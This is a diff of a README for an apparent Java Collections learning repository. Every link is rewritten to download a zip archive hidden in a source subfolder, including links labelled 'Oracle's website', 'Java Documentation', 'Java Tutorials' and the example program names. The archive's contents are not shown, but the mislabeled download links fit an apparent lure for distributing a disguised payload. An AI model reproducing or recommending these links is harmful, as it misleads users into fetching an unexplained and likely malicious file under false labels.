@@ -1,6 +1,6 @@
 # 📦 java-collections-framework - Learn Java Collections Easily
 
-[![Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip%20Now-Release-green)](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip)
+[![Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip%20Now-Release-green)](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Java Collections Framework repository. This guide will help you d
 
 To get started, visit this page to download the files you need:
 
-[Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip)
+[Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip)
 
 The download page contains multiple files. Choose the version that fits your needs. Once you find the right file, click on it to begin the download.
 
@@ -23,7 +23,7 @@ This repository contains Java programs that showcase the Java Collections Framew
 To run the programs in this repository, you need:
 
 - A computer with Windows, macOS, or Linux.
-- Java Development Kit (JDK) version 8 or later installed on your computer. You can download it from [Oracle's website](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip).
+- Java Development Kit (JDK) version 8 or later installed on your computer. You can download it from [Oracle's website](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip).
 - About 100 MB of free disk space to store the downloaded files.
 
 ## 📘 Key Concepts Covered
@@ -66,15 +66,15 @@ Here are some features of the Java Collections Framework programs you can expect
 
 ## 📊 Example Programs
 
-- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip**: Demonstrates how to use an ArrayList to store items and print them.
-- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip**: Shows the use of a HashSet to eliminate duplicate entries.
-- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip**: Illustrates how to work with a HashMap for storing key-value pairs.
-- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip**: Provides an example of how to enqueue and dequeue items in a priority queue.
+- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip**: Demonstrates how to use an ArrayList to store items and print them.
+- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip**: Shows the use of a HashSet to eliminate duplicate entries.
+- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip**: Illustrates how to work with a HashMap for storing key-value pairs.
+- **https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip**: Provides an example of how to enqueue and dequeue items in a priority queue.
 
 ## 🔗 Additional Resources
 
-- [Java Documentation](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip) for more information on each collection type.
-- [Java Tutorials](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip) for in-depth learning.
+- [Java Documentation](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip) for more information on each collection type.
+- [Java Tutorials](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip) for in-depth learning.
 
 ## 🛠️ Troubleshooting
 
@@ -91,4 +91,4 @@ For additional help, you can reach out to the community or check forums dedicate
 
 This repository provides a practical approach to learn the Java Collections Framework. It offers clear examples, covers key concepts, and is designed to be accessible to everyone. For further information, be sure to visit our release page:
 
-[Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/5- queue/framework-java-collections-v1.6.zip)
+[Download Latest Release](https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip https://github.com/johnpaulnarisetty/java-collections-framework/raw/refs/heads/master/6- map/2-Students Records/src/org/framework_java_collections_v1.9.zip)
